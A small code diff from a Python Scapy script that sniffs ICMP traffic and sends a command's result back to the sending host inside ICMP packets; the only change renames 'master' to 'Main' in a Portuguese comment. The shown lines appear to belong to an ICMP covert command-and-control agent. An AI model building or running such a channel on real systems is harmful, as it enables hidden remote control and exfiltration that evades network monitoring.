@@ -18,6 +18,6 @@ def handle_icmp(pkt):
           src = pkt['IP'].src
           print(src)
           print(command_result)
-          sr1(IP(dst=src)/ICMP()/command_result) # Retornar o resultado do comando para o master
+          sr1(IP(dst=src)/ICMP()/command_result) # Retornar o resultado do comando para o Main
 
 sniff(filter="icmp", prn=handle_icmp)
